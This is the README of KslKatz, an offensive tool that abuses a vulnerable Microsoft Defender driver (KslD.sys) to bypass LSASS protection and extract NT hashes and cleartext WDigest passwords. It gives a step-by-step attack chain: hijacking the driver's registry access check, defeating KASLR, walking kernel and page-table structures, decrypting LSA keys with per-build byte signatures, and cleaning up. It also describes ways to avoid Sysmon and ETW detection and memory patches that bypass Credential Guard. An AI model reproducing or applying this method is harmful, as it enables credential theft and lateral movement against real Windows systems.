<div align="center">

# KslKatz

**BYOVD Credential Extractor using Microsoft Defender's KslD.sys**

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Windows](https://img.shields.io/badge/platform-Windows-0078d4.svg)](https://www.microsoft.com/windows)
[![C++20](https://img.shields.io/badge/C%2B%2B-20-00599C.svg)](https://en.cppreference.com/w/cpp/20)
[![Build](https://img.shields.io/badge/build-VS2022-5C2D91.svg)](https://visualstudio.microsoft.com/)

*Extract MSV1_0 NT hashes and WDigest cleartext passwords from PPL-protected LSASS using only Microsoft-signed components. No third-party driver. Everything ships pre-installed with Windows Defender.*

*Developed in close collaboration with [opus](https://claude.ai).*

---

</div>

## Table of Contents

- [Overview](#overview)
- [Demo Output](#demo-output)
- [The Vulnerability](#the-vulnerability)
  - [The Read Primitive](#the-read-primitive)
  - [The Access Control](#the-access-control)
  - [The Blocklist Paradox](#the-blocklist-paradox)
- [Architecture](#architecture)
  - [EPROCESS Discovery](#eprocess-discovery)
  - [Physical Memory Read and PPL Bypass](#physical-memory-read-and-ppl-bypass)
  - [LSA Key Extraction](#lsa-key-extraction)
  - [MSV1_0 Credential Extraction](#msv1_0-credential-extraction)
  - [WDigest Cleartext Extraction](#wdigest-cleartext-extraction)
- [Attack Chain](#attack-chain)
- [Embedded Driver](#embedded-driver)
- [Comparison with Other Tools](#comparison-with-other-tools)
- [Supported Windows Versions](#supported-windows-versions)
- [Building](#building)
- [Project Structure](#project-structure)
- [Credits](#credits)
- [Responsible Disclosure](#responsible-disclosure)
- [Disclaimer](#disclaimer)

---

## Overview

KslKatz combines two proven techniques into a single standalone executable:

1. **KslD.sys BYOVD** for kernel/physical memory access, bypassing PPL protection on LSASS
2. **GhostKatz-style local signature scanning** for resolving lsasrv.dll and wdigest.dll internals without expensive remote memory scans

The result is a tool that reads LSASS credentials through physical memory using only a Microsoft-signed driver that is already present on disk, requires no internet access, no additional files, and cleans up after itself.

### What Gets Extracted

| Package | Data | Condition |
|---------|------|-----------|
| **MSV1_0** | NT Hash, LM Hash, SHA1 Hash per logon session | Always available after interactive logon |
| **WDigest** | Cleartext password (UTF-16) | Requires WDigest caching enabled (registry, GPO, or in-memory patch) |

---

## Demo Output

```
C:\> KslKatz.exe
[*] Windows Build 20348
[*] Setting up KslD driver...
  Deploying embedded driver to vKslD.sys...
  Driver deployed and verified
[+] Driver loaded
[*] KASLR bypass (SubCmd 2)...
  idtr=0xfffff8000b6cb000 cr3=0x6d5000
  ntoskrnl=0xfffff8000bc1f000
[*] Finding lsass.exe...
  Handle to SYSTEM (PID 4), our PID=5452, handle=0x124
  Handle table: 35540 entries
  SYSTEM EPROCESS=0xffffe60d6e099040
  Offsets: PID=0x440 Links=0x448 Name=0x5a8
[*] Walk ActiveProcessLinks from SYSTEM to find lsass.exe
  lsass.exe PID=724 DTB=0x1269e000
  PEB=0x3ab715f000 LDR=0x7ffb7e033140
[*] Finding lsasrv.dll...
  lsasrv.dll base=0x7ffb7ae80000 size=0x190000
[*] Extracting LSA encryption keys...
  LSA keys found
[*] Finding LogonSessionList...
[*] Extracting MSV1_0 credentials...
[*] Checking WDigest...
[*] Finding wdigest.dll in lsass...
  wdigest.dll base=0x7ffb7a3e0000 size=0x51000
  l_LogSessList at 0x7ffb7a42a5c8 (RVA=0x4a5c8)
[*] Restoring driver configuration...
  Removed deployed vKslD.sys
======================================================================
 MSV1_0 CREDENTIALS
======================================================================
[+] 2 credential(s):

  YOURDOM\admin
    NT:   aad3b435b51404eeaad3b435b51404ee

  YOURDOM\svc_backup
    NT:   31d6cfe0d16ae931b73c59d7e0c089c0

======================================================================
 WDIGEST CREDENTIALS (Cleartext)
======================================================================
[+] 1 credential(s):

  YOURDOM\admin
    Password: Summer2025!

======================================================================
[*] Total: 2 MSV1_0, 1 WDigest
```

---

## The Vulnerability

KslD.sys is a kernel driver shipped as part of Microsoft Defender. It is Microsoft-signed, loaded as a trusted kernel module, and exposes a device object `\\.\KslD` accessible from usermode via `CreateFileW`.

Microsoft ships two versions of this driver side by side:

| Version | Size | Location | MmCopyMemory | Status |
|---------|------|----------|-------------|--------|
| Patched | ~82 KB | `drivers\wd\KslD.sys` | Nulled out | Active (ImagePath points here) |
| Vulnerable | ~333 KB | `drivers\KslD.sys` | Functional | **Sitting on disk, never removed** |

The patched version deliberately clears the `MmCopyMemory` function pointer during initialization, disabling SubCmd 12. The vulnerable version stores it. Both binaries are Microsoft-signed and trusted by the OS. Defender platform updates drop the patched version into the `wd\` subdirectory and update `ImagePath`, but the old vulnerable version is never deleted from the `drivers\` directory.

KslKatz simply switches `ImagePath` back to the vulnerable version via `ChangeServiceConfigW` and restarts the service.

<details>
<summary><b>Why the old driver is still on disk</b></summary>

Microsoft's public documentation shows that KB4052623 delivers Defender platform updates, including a historical move of Defender drivers to `System32\drivers\wd\`. Windows servicing keeps WinSxS-backed component-store files via NTFS hard links and only removes superseded component versions during cleanup. On tested systems, this explains why the newer 82 KB KslD.sys arrives through the Defender platform-update path while the older 333 KB `System32\drivers\KslD.sys` remains as the current CBS-backed component-store copy until explicitly superseded by a newer CBS version.

</details>

### The Read Primitive

The core of the vulnerability is SubCmd 12, an unrestricted `MmCopyMemory()` wrapper exposed to usermode:

```c
// IOCTL 0x222044, SubCmd 12
struct IoReadInput {
    DWORD  SubCmd;       // 12
    DWORD  Reserved;     // 0
    QWORD  Address;      // Target virtual or physical address
    QWORD  Size;         // Number of bytes to read
    DWORD  Flags;        // 1 = Physical, 2 = Virtual
    DWORD  Padding;
};
// Output: raw memory contents, up to Size bytes
```

| Flag | Mode | Description |
|------|------|-------------|
| 1 | **Physical** | Reads any physical address via `MmCopyMemory`. Not subject to PPL, EPROCESS protection, or any usermode API restriction. This is the PPL bypass primitive. |
| 2 | **Virtual** | Reads kernel virtual addresses directly. Used for walking kernel structures (EPROCESS, IDT, ntoskrnl) without manual page table translation. |

SubCmd 2 provides additional information leaks:

```c
// IOCTL 0x222044, SubCmd 2
// Returns CPU register name/value pairs (8 bytes name + 8 bytes value each)
// Key registers: CR3 (current DTB), IDTR (IDT base), CR0, CR4
```

The combination of SubCmd 2 (KASLR defeat) and SubCmd 12 (arbitrary read) provides a complete kernel memory introspection capability from usermode.

### The Access Control

The driver validates the calling process by comparing its image path against the `AllowedProcessName` registry value stored under `HKLM\SYSTEM\CurrentControlSet\Services\KslD`. This value contains a full NT device path like `\Device\HarddiskVolume3\ProgramData\Microsoft\Windows Defender\Platform\4.18.x\MsMpEng.exe`.

This check is trivially bypassed because the registry value is:

- Editable by any local administrator
- Not protected by Defender's tamper protection mechanisms
- Not validated against code signing, binary integrity, or any cryptographic property
- A plain string comparison with no additional verification

KslKatz writes its own NT device path to `AllowedProcessName`, restarts the service, and opens the device handle.

### The Blocklist Paradox

Microsoft maintains a [Vulnerable Driver Blocklist](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules) (`DriverSiPolicy.p7b`) enforced via HVCI to prevent BYOVD attacks. From their documentation:

> *"The vulnerable driver blocklist is designed to help harden systems against **non-Microsoft-developed drivers** across the Windows ecosystem."*

**Microsoft's own drivers are excluded from the blocklist by design.**

---

## Architecture

### EPROCESS Discovery

KslKatz needs to find the `lsass.exe` EPROCESS structure in kernel memory to obtain its Directory Table Base (DTB/CR3) for page table walks. The approach uses the `SystemHandleInformation` API to leak a kernel object pointer:

```
1. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, PID=4)
   -> Obtains a handle to the SYSTEM process

2. RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE)
   -> Required for Object pointers in handle table results

3. NtQuerySystemInformation(SystemHandleInformation)
   -> Returns all open handles in the system with their Object pointers
   -> Find our handle by matching (our PID, our handle value)
   -> Object field = kernel address of SYSTEM EPROCESS

4. Read SYSTEM EPROCESS via SubCmd 12 (virtual read, 0x800 bytes)
   -> Scan for PID=4 followed by a kernel pointer -> UniqueProcessId + ActiveProcessLinks offsets
   -> Scan for "System\0" string -> ImageFileName offset
   -> All offsets detected dynamically, no hardcoded values per build

5. Walk ActiveProcessLinks doubly-linked list
   -> Read ImageFileName at each EPROCESS
   -> Match "lsass.exe" -> extract DTB from EPROCESS+0x28
   -> Auto-detect PEB offset by scanning for valid usermode pointer with PEB/LDR structure
```

<details>
<summary><b>Why not use PsInitialSystemProcess?</b></summary>

Tools like GhostKatz and Mimikatz locate the SYSTEM EPROCESS by resolving `PsInitialSystemProcess` from ntoskrnl.exe exports (`EnumDeviceDrivers` + `LoadLibrary("ntoskrnl.exe")` + `GetProcAddress`). This approach has two problems:

1. **LoadLibrary triggers ETW/Sysmon events.** Loading ntoskrnl.exe into the process generates Image Load events (Sysmon Event 7) that defensive tools monitor.

2. **Export directory is broken on recent builds.** On Windows 11 Build 26200+, ntoskrnl's PE export directory header has `exp_sz=0x6b` (only 107 bytes), with actual export tables at separate RVAs. Both Python and C++ PE parsers fail to resolve exports from this layout.

The `SystemHandleInformation` approach avoids both problems: no DLL loading, no export parsing, and it works on all tested builds from 7600 to 26200.

</details>

### Physical Memory Read and PPL Bypass

Protected Process Light (PPL) was designed to prevent credential theft by blocking `OpenProcess` and `ReadProcessMemory` calls against LSASS from usermode. However, PPL only protects the usermode API path. It has no authority over kernel-mode physical memory operations.

KslD.sys SubCmd 12 calls `MmCopyMemory()` with attacker-supplied physical addresses. This kernel API operates below the process protection layer and reads physical memory pages regardless of which process owns them.

KslKatz translates lsass virtual addresses to physical addresses using a manual page table walk. GhostKatz uses Superfetch (`NtQuerySystemInformation` Class 79) for this purpose, building a global PFN-to-VA translation table. Both approaches achieve the same result through different means.

```
lsass DTB (from EPROCESS+0x28)
  |
  CR3 -> PML4 Table (512 entries, each 8 bytes)
    -> PML4E[va_bits[47:39]] -> PDPT Table
      -> PDPTE[va_bits[38:30]] -> Page Directory
        -> Large page (1GB)? -> PA = (entry & mask) | va_offset
        -> PDE[va_bits[29:21]] -> Page Table
          -> Large page (2MB)? -> PA = (entry & mask) | va_offset
          -> PTE[va_bits[20:12]] -> 4KB Page
            -> PA = (PTE & 0xFFFFFFFFF000) | va_bits[11:0]
```

Each level requires one physical read via SubCmd 12. A full translation takes 4-5 IOCTLs. The implementation also handles transition pages (standby list, bit 11 set in PTE) which are common for LSASS memory that has been trimmed from the working set but not paged out.

### LSA Key Extraction

LSASS encrypts all cached credentials using two symmetric keys (AES-256 and 3DES-168) and a 16-byte initialization vector. These are stored in global variables inside `lsasrv.dll` and referenced by code patterns that Mimikatz originally identified.

KslKatz uses a **local file scan** approach instead of scanning remote lsass memory:

```
1. ReadFile("C:\Windows\System32\lsasrv.dll")
   -> Read entire DLL as raw bytes (std::ifstream, no LoadLibrary, no ETW event)

2. Parse PE header manually
   -> Find .text section: raw_offset, raw_size, virtual_address

3. Scan .text raw bytes for signature patterns
   -> 9 signature variants covering Windows Vista through 11 24H2
   -> Each signature has offsets to IV, 3DES key ptr, and AES key ptr

4. Resolve RIP-relative displacements from raw bytes
   -> disp32 at sig_offset + iv_off
   -> target_rva = text_virtual_address + instruction_offset + 4 + disp32

5. Convert RVA to lsass virtual address
   -> target_va = lsasrv_base_in_lsass + target_rva

6. Read actual key data from lsass (3 targeted physical reads)
   -> IV: 16 bytes directly
   -> h3DesKey and hAesKey: pointer dereference + BCRYPT structure traversal
```

<details>
<summary><b>Why read from disk instead of LoadLibrary?</b></summary>

`LoadLibraryA("lsasrv.dll")` would load the DLL into our process, which:

- Triggers Sysmon Event 7 (Image Load) and ETW `Microsoft-Windows-Kernel-Process` events
- Executes `DllMain` with potential side effects
- Appears in the PEB module list, visible to any process inspector

Reading the file from disk with `std::ifstream` generates only a standard file read operation. No image load event, no DllMain execution, no PEB entry. The raw bytes contain the same `.text` section with the same signatures and the same RIP-relative displacements. The only difference is that addresses must be computed as RVAs (relative to section virtual address) rather than absolute pointers.

This is also how KslKatz differs from GhostKatz, which uses `LoadLibraryA` for its local signature scans.

</details>

<details>
<summary><b>BCRYPT key structure traversal</b></summary>

The LSA key variables (`hAesKey`, `h3DesKey`) are pointers to `BCRYPT_HANDLE_KEY` structures. The actual symmetric key bytes are buried three levels deep:

```
hAesKey (global variable in lsasrv.dll .data section)
  |
  poi(hAesKey) -> BCRYPT_HANDLE_KEY
    +0x00: size
    +0x04: tag = "UUUR" (0x55555552)    <- validation checkpoint
    +0x08: hAlgorithm
    +0x10: key pointer -----------------> BCRYPT_KEY81
      +0x00: size
      +0x04: tag = "MSSK" (0x4D53534B)  <- validation checkpoint
      +0x08: type, unk0-unk9 fields
      +0x38: HARD_KEY
        +0x00: cbSecret (ULONG, key length in bytes)
        +0x04: data[cbSecret]            <- actual AES/3DES key bytes
```

The `hk_off` field in the signature table specifies the offset to `HARD_KEY` within the key structure. This varies by Windows version:

| Structure | hk_off | Windows Versions |
|-----------|--------|-----------------|
| `BCRYPT_KEY` | `0x18` | Vista, 7 |
| `BCRYPT_KEY80` | `0x28` | 8, 8.1 |
| `BCRYPT_KEY81` | `0x38` | 10, 11, Server 2016+ |

KslKatz validates both the "UUUR" and "MSSK" tags before reading key data to prevent false positives from stale or incorrect signature matches.

</details>

<details>
<summary><b>All supported LSA key signatures</b></summary>

| Pattern | IV Offset | DES Offset | AES Offset | hk_off | Windows Versions |
|---------|-----------|------------|------------|--------|-----------------|
| `83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15` | 71 | -89 | 16 | 0x38 | 11 22H2+ |
| Same pattern | 58 | -89 | 16 | 0x38 | 11 21H2 |
| Same pattern | 67 | -89 | 16 | 0x38 | 10 1809-1909 |
| Same pattern | 61 | -73 | 16 | 0x38 | 10 1507-1803 |
| `83 64 24 30 00 44 8b 4d d8 48 8b 0d` | 62 | -70 | 23 | 0x38 | 8.1 (KEY81) |
| Same pattern | 62 | -70 | 23 | 0x28 | 8 (KEY80) |
| Same pattern | 58 | -62 | 23 | 0x28 | 8 (alternate) |
| `83 64 24 30 00 44 8b 4c 24 48 48 8b 0d` | 59 | -61 | 25 | 0x18 | 7 |
| Same pattern | 63 | -69 | 25 | 0x18 | Vista |

</details>

### MSV1_0 Credential Extraction

MSV1_0 is the primary authentication package in Windows. It caches NT hashes for every interactive logon session. The `LogonSessionList` is a linked list (or array of linked lists on newer builds) inside `lsasrv.dll` containing all active sessions.

KslKatz locates `LogonSessionList` using the same local-file-scan technique, then walks the list via physical memory reads:

```
LogonSessionList[0..count-1]    (array of list heads, count from LogonSessionListCount)
  |
  poi(head) -> Flink
  |
  Entry (KIWI_MSV1_0_LIST_63)
    +0x00: Flink                         -> next entry
    +0x70: LUID                          -> logon session ID
    +0x90: Username (UNICODE_STRING)     -> e.g. "admin"
    +0xA0: Domain (UNICODE_STRING)       -> e.g. "YOURDOM"
    +0xD0: pSid                          -> user SID
    +0x108: Credentials pointer ---------> KIWI_MSV1_0_CREDENTIALS
      +0x00: next                          -> credential chain (linked list)
      +0x10: PrimaryCredentials ---------> KIWI_MSV1_0_PRIMARY_CREDENTIALS
        +0x00: next                        -> primary cred chain
        +0x08: Primary (ANSI_STRING)       -> package name, must be "Primary"
        +0x18: encrypted blob length
        +0x20: encrypted blob pointer ---> encrypted MSV1_0_PRIMARY_CREDENTIAL
```

The encrypted blob is decrypted using the LSA keys:

- If `blob_length % 8 != 0`: **AES-CFB128** with hAesKey + full IV (16 bytes)
- If `blob_length % 8 == 0`: **3DES-CBC** with h3DesKey + IV[:8]

The decrypted `MSV1_0_PRIMARY_CREDENTIAL` structure contains:

| Offset | Size | Field |
|--------|------|-------|
| 0x40 | 1 | isIso (Credential Guard isolated) |
| 0x41 | 1 | isNtOwfPassword (NT hash present) |
| 0x46 | 16 | NT Hash |
| 0x56 | 16 | LM Hash |
| 0x66 | 20 | SHA1 Hash |

KslKatz checks `isIso == 0` and `isNtOwfPassword == 1` before extracting hashes. If Credential Guard is active, `isIso` will be set and the actual hashes are isolated in the Virtualization-Based Security (VBS) enclave, inaccessible even through physical memory reads.

<details>
<summary><b>When are MSV1_0 credentials cached?</b></summary>

| Logon Type | Scenario | Credentials Cached |
|------------|----------|--------------------|
| Type 2 (Interactive) | Console login, UAC elevation | Yes, NT/LM/SHA1 |
| Type 10 (RemoteInteractive) | RDP session | Yes, NT/LM/SHA1 |
| Type 9 (NewCredentials) | `runas /netonly` | Yes, for the new identity |
| Type 5 (Service) | Service running as domain account | Yes, while service runs |
| Type 3 (Network) | SMB/NTLM network authentication | Session token only, **no hash cache** |

Credentials persist for the lifetime of the logon session. A user logged in via RDP with a disconnected (not logged off) session has their hashes in memory until the session is terminated. This is why credential hygiene and session management matter.

</details>

<details>
<summary><b>All supported LogonSessionList signatures</b></summary>

| Pattern | Offset | min_build | Windows Version |
|---------|--------|-----------|-----------------|
| `45 89 34 24 48 8b fb 45 85 c0 0f` | 25 | 26200 | 11 24H2/25H2 |
| `45 89 34 24 8b fb 45 85 c0 0f` | 25 | 26200 | 11 24H2 (alt) |
| `45 89 37 49 4c 8b f7 8b f3 45 85 c0 0f` | 27 | 22631 | 11 22H2-23H2 |
| `45 89 34 24 4c 8b ff 8b f3 45 85 c0 74` | 24 | 20348 | Server 2022, 11 21H2 |
| `33 ff 41 89 37 4c 8b f3 45 85 c0 74` | 23 | 18362 | 10 1903-2004 |
| `33 ff 41 89 37 4c 8b f3 45 85 c9 74` | 23 | 17134 | 10 1803 |
| `33 ff 45 89 37 48 8b f3 45 85 c9 74` | 23 | 15063 | 10 1703 |
| `33 ff 41 89 37 4c 8b f3 45 85 c0 74` | 16 | 10240 | 10 1507-1607 |

</details>

### WDigest Cleartext Extraction

WDigest is an older HTTP Digest authentication protocol. When enabled, `wdigest.dll` caches plaintext passwords in an internal doubly-linked list called `l_LogSessList` so they can be reused for subsequent authentications.

KslKatz locates `l_LogSessList` by reading `wdigest.dll` from disk and scanning for the signature pattern:

```
Disassembly at the signature location:

  48 8d 0d xx xx xx xx    lea  rcx, [rip+disp32]    ; rcx = &l_LogSessList
  48 3b d9                cmp  rbx, rcx              ; <-- signature: 48 3b d9 74
  74 xx                   je   short skip

The disp32 displacement is at signature_offset - 4 in the raw .text bytes.
target_rva = text_virtual_address + signature_offset + disp32
l_LogSessList_va = wdigest_base_in_lsass + target_rva
```

The list structure:

```
l_LogSessList (Head)
  |
  Flink -> KIWI_WDIGEST_LIST_ENTRY
    +0x00: Flink                          -> next entry
    +0x08: Blink                          -> previous entry
    +0x10: UsageCount (ULONG)
    +0x18: This (self-pointer)
    +0x20: LUID (logon session ID)
    +0x28: (unknown/reserved)
    +0x30: Username (UNICODE_STRING)      -> e.g. "admin"
    +0x40: Domain (UNICODE_STRING)        -> e.g. "YOURDOM"
    +0x50: Password (UNICODE_STRING)      -> encrypted cleartext password
```

The password at offset `+0x50` is encrypted with **3DES-CBC** using the same `h3DesKey` and `IV[:8]` extracted during LSA key extraction. After decryption, the result is the plaintext password as a UTF-16LE string.

For machine accounts (username ending with `$`), the decrypted password is a binary blob rather than readable text. KslKatz outputs these as hex strings.

<details>
<summary><b>When is WDigest caching active?</b></summary>

WDigest cleartext caching is controlled by `g_fParameter_UseLogonCredential` inside the loaded `wdigest.dll`. This variable can be set through multiple paths:

| Method | Persistence | Detection |
|--------|------------|-----------|
| Registry: `HKLM\...\WDigest\UseLogonCredential = 1` | Survives reboot | Easily auditable |
| Group Policy | Survives reboot | GPO audit trail |
| In-memory patch of `g_fParameter_UseLogonCredential` to 1 | Until reboot | No registry artifact |
| In-memory patch of `g_IsCredGuardEnabled` to 0 | Until reboot | Bypasses Credential Guard check |

On Windows 10+ the default is `UseLogonCredential=0` (caching disabled). On Windows 7/8, the default is enabled.

KslKatz **always attempts WDigest extraction** regardless of the registry value, because the in-memory state may differ from what the registry says (e.g., after in-memory patching via tools like NativeBypassCredGuard). If `l_LogSessList` is empty or unmapped, KslKatz reports this without error.

</details>

---

## Attack Chain

```
                                 KslKatz Execution Flow
 +------------------------------------------------------------------------+
 |                                                                        |
 |  1. DRIVER SETUP                                                       |
 |     Check drivers\KslD.sys (SHA256) -> found? use it                   |
 |     Check drivers\vKslD.sys (SHA256) -> found? use it                  |
 |     Neither? -> deploy from embedded payload, verify SHA256             |
 |     ChangeServiceConfigW(ImagePath = vulnerable driver)                |
 |     RegSetValueEx(AllowedProcessName = our NT device path)             |
 |     StartServiceW(KslD) -> CreateFileW("\\.\KslD")                     |
 |                                                                        |
 |  2. KASLR BYPASS                                                       |
 |     SubCmd 2 -> IDTR base address + CR3                                |
 |     Read IDT entries -> find lowest ISR address                        |
 |     Scan backwards (page-aligned) for MZ header -> ntoskrnl base       |
 |                                                                        |
 |  3. EPROCESS DISCOVERY                                                 |
 |     OpenProcess(PID 4) -> NtQuerySystemInformation(HandleInfo)         |
 |     -> SYSTEM EPROCESS kernel address                                  |
 |     Detect PID/Links/Name offsets dynamically from SYSTEM EPROCESS     |
 |     Walk ActiveProcessLinks -> find lsass.exe                          |
 |     Read DTB from EPROCESS+0x28, auto-detect PEB offset               |
 |                                                                        |
 |  4. LSA KEY EXTRACTION                                                 |
 |     ReadFile(lsasrv.dll) -> local .text signature scan                 |
 |     RIP-relative RVA resolution -> 3 targeted physical reads           |
 |     BCRYPT_HANDLE_KEY -> BCRYPT_KEY81 -> HARD_KEY -> AES + 3DES + IV   |
 |                                                                        |
 |  5. MSV1_0 EXTRACTION                                                  |
 |     ReadFile(lsasrv.dll) -> local scan for LogonSessionList            |
 |     Walk linked list via physical reads                                |
 |     Decrypt Primary credentials -> NT / LM / SHA1 hashes              |
 |                                                                        |
 |  6. WDIGEST EXTRACTION                                                 |
 |     ReadFile(wdigest.dll) -> local scan for l_LogSessList              |
 |     Walk linked list via physical reads                                |
 |     3DES-CBC decrypt -> cleartext passwords                            |
 |                                                                        |
 |  7. CLEANUP                                                            |
 |     ChangeServiceConfigW(original ImagePath)                           |
 |     RegSetValueEx(original AllowedProcessName)                         |
 |     StartServiceW (restore original driver state)                      |
 |     DeleteFileW(vKslD.sys) if we deployed it                           |
 |                                                                        |
 +------------------------------------------------------------------------+
```

---

## Embedded Driver

KslKatz embeds the vulnerable 333KB KslD.sys directly as a compiled-in C array (`driver_payload.h`). This makes the tool fully standalone with no external file dependencies.

| Priority | Path | Condition | Action |
|----------|------|-----------|--------|
| 1 | `drivers\KslD.sys` | Exists, size=333216, SHA256 match | Use directly, no file written |
| 2 | `drivers\vKslD.sys` | Exists, size=333216, SHA256 match | Use directly, no file written |
| 3 | Embedded payload | Neither found | Write to `vKslD.sys`, verify SHA256, delete on cleanup |

Driver SHA256: `bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a`

---

## Comparison with Other Tools

| Feature | KslKatz | GhostKatz | Mimikatz | KernelKatz |
|---------|---------|-----------|----------|------------|
| Driver | Microsoft-signed KslD.sys | Third-party vuln drivers | None (usermode) | Third-party vuln drivers |
| Read primitive | `MmCopyMemory` via IOCTL | Byte-by-byte phys read | `OpenProcess` + `ReadProcessMemory` | Kernel read |
| PPL bypass | Yes (physical reads) | Yes (physical reads) | No (blocked by PPL) | Yes |
| Address translation | Page table walk | Superfetch PFN database | N/A (usermode) | Varies |
| Signature scan | Local file read (no ETW) | `LoadLibrary` (ETW event) | In-process | Varies |
| EPROCESS discovery | Handle table leak | `PsInitialSystemProcess` export | `OpenProcess` | Varies |
| MSV1_0 hashes | Yes | Yes | Yes | Yes |
| WDigest cleartext | Yes | Yes | Yes | Varies |
| Standalone EXE | Yes (embedded driver) | No (BOF + driver file) | Yes | No |
| Cleanup | Full restore (SCM + registry) | Service delete | N/A | Varies |

---

## Supported Windows Versions

| Version | Build | MSV1_0 | WDigest | Tested |Notes |
|---------|-------|--------|---------|-------|-------|
| Windows 7 | 7600 | Yes | Yes | No | WDigest enabled by default |
| Windows 8 | 9200 | Yes | Yes |No | WDigest enabled by default |
| Windows 8.1 | 9600 | Yes | Yes |No | WDigest enabled by default |
| Windows 10 1507-1607 | 10240-14393 | Yes | Yes |No| WDigest disabled by default |
| Windows 10 1703 | 15063 | Yes | Yes |No |
| Windows 10 1803 | 17134 | Yes | Yes |No |
| Windows 10 1809-1909 | 17763-18363 | Yes | Yes |No |
| Windows 10 2004-22H2 | 19041-19045 | Yes | Yes | No |
| Windows Server 2022 | 20348 | Yes | Yes | Yes |
| Windows 11 21H2-23H2 | 22000-22631 | Yes | Yes |No |
| Windows 11 24H2/25H2 | 26100-26200 | Yes | Yes |Yes |

> **Note:** The vulnerable 333KB KslD.sys must be present on the target system or will be deployed from the embedded payload. Systems freshly installed with recent Defender versions may only have the patched 82KB version in `drivers\wd\`.

---

## Building

**Requirements:** Visual Studio 2022, C++20 (MSVC v143 toolset), Windows SDK 10.0

```bash
git clone https://github.com/S1lky/KslKatz.git
cd KslKatz
```

Open `KslKatz.sln` in Visual Studio 2022. Select **x64 Release**. Build.

Output: `bin\Release\KslKatz.exe` (~700KB standalone, no runtime dependencies)

---

## Project Structure

```
KslKatz/
  KslKatz.sln                  Visual Studio 2022 solution
  KslKatz.vcxproj              Project file (x64, C++20, v143)
  KslKatz.vcxproj.filters      Source file grouping
  src/
    common.h                   Shared types, unaligned read helpers, credential structs
    driver.h / driver.cpp      KslD IOCTL interface, SCM service management,
                               SHA256 driver verification, embedded driver deployment
    driver_payload.h           Vulnerable KslD.sys as uint8_t array (333KB, 20K lines)
    memory.h / memory.cpp      Page table walk (PML4/PDPT/PD/PT + transition pages),
                               proc_read, read_ptr, resolve_rip, read_ustr, pattern scan
    crypto.h / crypto.cpp      AES-CFB128 (manual ECB+XOR), 3DES-CBC, RC4, DES-ECB,
                               MD5, SHA256 -- all via Windows CNG (bcrypt.lib)
    lsa.h / lsa.cpp            KASLR bypass, EPROCESS leak via SystemHandleInformation,
                               LSA key extraction (local file scan + BCRYPT traversal),
                               LogonSessionList walk, MSV1_0 credential decryption
    wdigest.h / wdigest.cpp    l_LogSessList location via local file scan,
                               linked list walk, 3DES-CBC password decryption
    main.cpp                   Orchestration, phase sequencing, output formatting
```

---

## Credits

- [**Mimikatz**](https://github.com/gentilkiwi/mimikatz) by Benjamin Delpy -- LSA structure definitions, signature patterns, credential decryption logic, and the foundational research that made all of this possible
- [**GhostKatz**](https://github.com/julianpena/GhostKatz) by Julian Pena and Eric Esquivel -- local signature scan approach, WDigest list walking, and the Superfetch address translation concept
- [**KslDump**](https://github.com/S1lky/KslDump) -- KslD.sys BYOVD vulnerability discovery, IOCTL reverse engineering, and the original Python PoC

---

## Responsible Disclosure

The KslD.sys vulnerability was reported to Microsoft Security Response Center (MSRC). It was closed as **"Not a Vulnerability"** with the following rationale:

> *"The described attack depends on pre-existing administrative privileges. No evidence was provided showing how those privileges were obtained. Reports that assume administrative or root access without demonstrating a vulnerability that grants those privileges are considered lower impact, as an attacker with such access could already perform more severe actions."*

No CVE was assigned. No fix was issued. The vulnerable driver remains on disk.

---

## Disclaimer

This tool is provided for authorized security testing and educational purposes only. Use it only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.

---

<div align="center">

*Built with C++20 | No external dependencies | Single standalone executable*

</div>
